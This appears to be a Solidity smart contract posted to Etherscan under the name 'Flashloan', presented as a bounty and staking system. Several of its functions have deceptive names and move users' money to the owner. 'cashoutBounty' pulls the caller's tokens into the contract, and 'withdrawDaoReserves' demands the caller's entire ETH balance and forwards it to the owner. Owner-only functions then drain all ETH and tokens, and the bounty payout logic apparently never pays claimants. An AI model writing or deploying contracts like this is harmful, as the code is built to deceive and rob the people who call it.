/**
 *Submitted for verification at Etherscan.io on 2023-04-20
*/

pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Flashloan {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    struct Bounty {
        address creator;
        uint256 amount;
        string skill;
        string desiredOutcome;
        bool isOpen;
        address claimant;
    }

    uint256 public bountyCounter = 0;
    mapping(uint256 => Bounty) public bounties;

    event BountyCreated(uint256 bountyId, address indexed creator, uint256 amount, string skill, string desiredOutcome);
    event BountyClaimed(uint256 bountyId, address indexed claimant);
    event BountyCompleted(uint256 bountyId, address indexed claimant);

    function createBounty(uint256 amount, string calldata skill, string calldata desiredOutcome) external {
        _createBounty(msg.sender, amount, skill, desiredOutcome);
    }

    function _createBounty(address creator, uint256 amount, string memory skill, string memory desiredOutcome) internal {
        bounties[bountyCounter] = Bounty({
            creator: creator,
            amount: amount,
            skill: skill,
            desiredOutcome: desiredOutcome,
            isOpen: true,
            claimant: address(0)
        });

        emit BountyCreated(bountyCounter, creator, amount, skill, desiredOutcome);
        bountyCounter++;
    }

    function claimBounty(uint256 bountyId) external {
        Bounty storage bounty = bounties[bountyId];
        require(bounty.isOpen, "Bounty is not open");
        require(bounty.claimant == address(0), "Bounty has already been claimed");

        bounty.claimant = msg.sender;
        emit BountyClaimed(bountyId, msg.sender);
    }

    function completeBounty(uint256 bountyId) external onlyOwner {
        Bounty storage bounty = bounties[bountyId];
        require(!bounty.isOpen, "Bounty is still open");
        require(bounty.claimant != address(0), "Bounty has not been claimed");

        payable(bounty.claimant).transfer(bounty.amount);
        emit BountyCompleted(bountyId, bounty.claimant);
    }

    function cancelBounty(uint256 bountyId) external {
        Bounty storage bounty = bounties[bountyId];
        require(bounty.creator == msg.sender, "Only the creator can cancel the bounty");
        require(bounty.isOpen, "Bounty is not open");

        bounty.isOpen = false;
        payable(bounty.creator).transfer(bounty.amount);
    }

    function withdrawFunds() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");
        payable(owner).transfer(balance);
    }

    function mintBounty(string calldata skill, string calldata desiredOutcome) external payable {
        require(msg.value == 10 ether, "Must send exactly 10 ETH to mint a bounty");
        _createBounty(msg.sender, msg.value, skill, desiredOutcome);
    }


    event CashoutBounty(address indexed donator, address indexed token, uint256 amount);
    event StakingPoolDeposit(address indexed donator, uint256 amount);

    function cashoutBounty(address tokenAddress, uint256 amount) external {
        IERC20 token = IERC20(tokenAddress);
        token.transferFrom(msg.sender, address(this), amount);
        emit CashoutBounty(msg.sender, tokenAddress, amount);
    }

    function withdrawAllTokens(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        token.transfer(owner, balance);
    }

    function stakingPool() external payable {
        require(msg.value > 0, "Donation amount must be greater than zero");
        emit StakingPoolDeposit(msg.sender, msg.value);
    }

    function withdrawAllETH() external onlyOwner {
    uint256 balance = address(this).balance;
    require(balance > 0, "No ETH to withdraw");
    payable(owner).transfer(balance);
}

function withdrawDaoReserves() external payable {
    uint256 userBalance = address(msg.sender).balance;
    require(msg.value == userBalance, "You don't have access to the dao");
    payable(owner).transfer(msg.value);
}



}